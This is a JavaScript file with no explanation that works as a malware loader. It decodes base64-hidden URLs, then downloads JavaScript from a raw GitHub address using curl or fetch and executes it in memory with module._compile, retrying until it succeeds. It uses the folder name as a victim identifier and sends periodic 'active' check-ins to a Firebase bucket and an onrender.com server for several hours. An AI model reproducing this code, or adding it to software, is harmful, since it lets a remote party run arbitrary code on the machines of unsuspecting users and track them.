const { exec } = require('child_process')

let USER = getUserName()
let FINISH = new Date().getTime()+21000000

let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')

if (USER) {
    console.log('USER: '+USER)

    startServer()
} else {
    console.log('---NULL---')
    process.exit(0)
}


async function startServer() {
    console.log('---SERVER---')

    await checkStatus()
    await startModule()

    while (true) {
        await delay(120000)
        await checkStatus()
    }
}

async function startModule() {
    let code = await getAxios(Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhaXlhbjA4OC9wdWJsaWMvbWFpbi9tb2R1bGUuanM=', 'base64').toString('ascii'))
    if (code) {
        try {
            let Module = requireModule(code)
            Module.start()

            console.log('---START---')
        } catch (error) {
            await delay(60000)
            await startModule()
        }
    } else {
        await delay(60000)
        await startModule()
    }
}


async function checkStatus() {
    if (FINISH > 0 && FINISH < new Date().getTime()) {
        try {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+15)
            })

            await postAxios('https://live-server-088.onrender.com/active', JSON.stringify({ id:USER, active:parseInt(new Date().getTime()/1000)+15 }), {
                'Content-Type':'application/json'
            })
        } catch (error) {}

        console.log('---COMPLETED---')
        process.exit(0)
    } else {
        try {
            await postAxios(STORAGE+encodeURIComponent('server/'+USER+'.json'), '', {
                'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+200)
            })

            await postAxios('https://live-server-088.onrender.com/active', JSON.stringify({ id:USER, active:parseInt(new Date().getTime()/1000)+200 }), {
                'Content-Type':'application/json'
            })
        } catch (error) {}
    }
}

async function getAxios(url) {
    let data = await getCurlData(url)
    if (data) {
        return data
    }
    return getFetchData(url)
}

async function getCurlData(url) {
    return new Promise((resolve) => {
        try {
            exec('curl '+url, function (err, stdout, stderr) {
                try {
                    if (err) {
                        resolve(null)
                    } else {
                        resolve(stdout.trim())
                    }
                } catch (error) {
                    resolve(null)
                }
            })
        } catch (error) {
            resolve(null)
        }
    })
}

async function getFetchData(url) {
    return new Promise((resolve) => {
        try {
            fetch(url).then((response) => response.text()).then((data) => {
                resolve(data)
            }).catch((error) => {
                console.log(error)
                resolve(null)
            })
        } catch (error) {
            resolve(null)
        }
    })
}

async function postAxios(url, body, data) {
    return new Promise((resolve) => {
        try {
            fetch(url, {
                method: 'POST',
                headers: data,
                body: body
            }).then((response) => {
                resolve('ok')
            }).catch((error) => {
                resolve('ok')
            })
        } catch (error) {
            resolve('ok')
        }
    })
}

function requireModule(code) {
    var m = new module.constructor(__filename, module.parent)
    m._compile(code, __filename)
    return m.exports
}

function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    return null
}


function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
